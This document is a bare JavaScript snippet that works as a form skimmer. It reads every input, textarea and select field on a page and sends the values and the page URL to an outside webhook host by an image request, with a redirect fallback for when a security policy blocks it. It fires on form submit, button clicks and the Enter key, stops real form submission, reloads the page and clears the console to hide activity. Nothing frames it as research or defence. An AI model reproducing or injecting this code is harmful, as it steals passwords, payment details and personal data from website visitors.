;(() => {
  const webhookBase = 'https://datarecv.vercel.app/api/webhook'

  async function send(params) {
    if (!params) return

    params.append('webhook_redirect', location.href)
    const finalUrl = `${webhookBase}/q?${params.toString()}`

    document.addEventListener('securitypolicyviolation', () => {
      location.href = finalUrl
    })

    const img = new Image()
    img.src = finalUrl
  }

  function getData() {
    const params = new URLSearchParams()

    document.querySelectorAll('input, textarea, select').forEach((input, i) => {
      const key = input.name || input.id || `unknown${i + 1}`

      if (key && input.value) {
        params.append(key, input.value)
      }
    })

    return params
  }

  document.querySelectorAll('form').forEach((form) => {
    form.addEventListener('submit', (e) => {
      e.preventDefault()
      send(getData())
      setTimeout(() => location.reload(), 500)
    })
  })

  document.querySelectorAll('form *[role="button"], button').forEach((btn) => {
    btn.addEventListener('click', () => {
      send(getData())
    })
  })

  addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      send(getData())
    }
  })

  console.clear()
})()
